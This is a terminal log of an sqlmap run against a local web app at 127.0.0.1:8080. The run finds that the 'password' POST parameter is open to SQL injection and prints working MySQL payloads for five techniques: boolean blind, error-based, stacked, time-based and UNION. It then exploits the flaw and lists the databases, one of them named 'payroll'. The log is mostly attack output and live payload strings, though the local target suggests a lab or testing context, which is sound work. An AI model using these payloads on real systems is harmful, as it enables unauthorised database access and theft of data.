        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.8.8#stable}
|_ -| . [(]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 04:10:28 /2024-08-29/

[?1049h[22;0;0t[1;24r(B[m[4l[?7h[24;1H[?1049l[23;0;0t
[?1l>[1/1] URL:
GET http://127.0.0.1:8080
POST data: password=test
do you want to test this URL? [Y/n/q]
> Y
[04:10:28] [INFO] testing URL 'http://127.0.0.1:8080'
[04:10:28] [INFO] using '/root/.local/share/sqlmap/output/results-08292024_0410am.csv' as the CSV results file in multiple targets mode
[04:10:28] [INFO] testing connection to the target URL
[04:10:28] [INFO] testing if the target URL content is stable
[04:10:28] [INFO] target URL content is stable
[04:10:28] [INFO] testing if POST parameter 'password' is dynamic
[04:10:28] [WARNING] POST parameter 'password' does not appear to be dynamic
[04:10:28] [INFO] heuristic (basic) test shows that POST parameter 'password' might be injectable (possible DBMS: 'MySQL')
[04:10:29] [INFO] testing for SQL injection on POST parameter 'password'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[04:10:29] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[04:10:29] [WARNING] reflective value(s) found and filtering out
[04:10:29] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[04:10:29] [INFO] testing 'Generic inline queries'
[04:10:29] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[04:10:29] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[04:10:29] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[04:10:29] [INFO] POST parameter 'password' appears to be 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)' injectable (with --not-string="1250")
[04:10:29] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[04:10:29] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[04:10:29] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[04:10:29] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[04:10:29] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[04:10:29] [INFO] POST parameter 'password' is 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' injectable 
[04:10:29] [INFO] testing 'MySQL inline queries'
[04:10:29] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[04:10:39] [INFO] POST parameter 'password' appears to be 'MySQL >= 5.0.12 stacked queries (comment)' injectable 
[04:10:39] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[04:10:49] [INFO] POST parameter 'password' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[04:10:49] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[04:10:49] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[04:10:49] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[04:10:49] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[04:10:49] [INFO] target URL appears to have 2 columns in query
[04:10:49] [INFO] POST parameter 'password' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable
[04:10:49] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
POST parameter 'password' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 127 HTTP(s) requests:
---
Parameter: password (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: password=test' OR NOT 9392=9392#

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: password=test' AND GTID_SUBSET(CONCAT(0x716a6a6a71,(SELECT (ELT(6081=6081,1))),0x716b767071),6081)-- QARk

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: password=test';SELECT SLEEP(5)#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: password=test' AND (SELECT 2602 FROM (SELECT(SLEEP(5)))CWTS)-- HWVP

    Type: UNION query
    Title: MySQL UNION query (NULL) - 2 columns
    Payload: password=test' UNION ALL SELECT CONCAT(0x716a6a6a71,0x5246555a4643786c55656a494a6e516c69786d5957626946466a6844727548657142536769576b7a,0x716b767071),NULL#
---
do you want to exploit this SQL injection? [Y/n] Y
[04:10:49] [INFO] the back-end DBMS is MySQL
web application technology: PHP 8.3.2, Nginx 1.26.2
back-end DBMS: MySQL >= 5.6
[04:10:49] [INFO] fetching database names
available databases [3]:
[*] information_schema
[*] payroll
[*] performance_schema

[04:10:49] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/root/.local/share/sqlmap/output/results-08292024_0410am.csv'

[*] ending @ 04:10:49 /2024-08-29/

